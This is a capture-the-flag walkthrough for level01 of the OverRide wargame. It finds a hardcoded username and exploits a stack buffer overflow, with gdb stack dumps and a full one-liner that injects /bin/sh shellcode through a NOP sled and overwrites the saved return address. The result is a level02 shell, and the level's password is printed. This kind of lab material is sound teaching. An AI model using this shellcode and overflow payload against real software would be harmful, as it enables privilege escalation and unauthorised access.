# Walkthrough level01

First we have execute the program.  

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: aaaa
verifying username....

nope, incorrect username...

```

With the disassembly code we have write c code. A comparaison with a string is do to verify username.   
So we have execute the program with this value :  

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
aaaa
nope, incorrect password...

```

A comparaison with a password is do but for each input, it's print "nope, incorrect password..." and programm return 1.
So we must write a shellcode in the buffer and override save EIP in our shellcode.

```bash
(gdb) r < <(echo "dat_wil"; python -c'print("aaaa")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level01/level01 < <(python -c'print("dat_wil")'; python -c'print("aaaa")')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 

Breakpoint 3, 0x08048574 in main ()
(gdb) ni
0x08048579 in main ()
(gdb) x/42xw $esp
0xffffd6d0:	0xffffd6ec	0x00000064	0xf7fcfac0	0x00000001
0xffffd6e0:	0xffffd8ee	0x0000002f	0xffffd73c	0x61616161
0xffffd6f0:	0x0000000a	0x00000000	0x00000000	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd710:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd720:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd730:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513

(gdb) i f 
Stack level 0, frame at 0xffffd740:
 eip = 0x8048579 in main; saved eip 0xf7e45513
 Arglist at 0xffffd738, args: 
 Locals at 0xffffd738, Previous frame's sp is 0xffffd740
 Saved registers:
  ebx at 0xffffd730, ebp at 0xffffd738, edi at 0xffffd734, eip at 0xffffd73c
```

Saved EIP is at 0xffffd73c. So we must write 84 bytes in buffer to erase it.   
We can write our shellcode and point save EIP in that address using NOP instruction.   
We have a buffer of 64 bytes but we fgets 100 bytes in stdin. So we can override save EIP.

```bash
(gdb) r < <(echo "dat_wil"; python -c'print("\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 20 + "\xff\xff\xd7\x00"[::-1])')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 

0x08048579 in main ()
(gdb) x/42xw $esp
0xffffd6d0:	0xffffd6ec	0x00000064	0xf7fcfac0	0x00000001
0xffffd6e0:	0xffffd8ee	0x0000002f	0xffffd73c	0x90909090
0xffffd6f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd700:	0x90909090	0x90909090	0x90909090	0x6850c031
0xffffd710:	0x68732f2f	0x69622f68	0x89e3896e	0xb0c289c1
0xffffd720:	0x3180cd0b	0x80cd40c0	0x42424242	0x42424242
0xffffd730:	0x42424242	0x42424242	0x42424242	0xffffd700
0xffffd740:	0x0000000a	0xffffd7d4	0xffffd7dc	0xf7fd3000
0xffffd750:	0x00000000	0xffffd71c	0xffffd7dc	0x00000000
```
 If we execute this payload in a terminal we obtain a shell.

 ```bash
 level01@OverRide:~$ (echo "dat_wil"; python -c'print("\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * 20 + "\xff\xff\xd7\x00"[::-1])'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
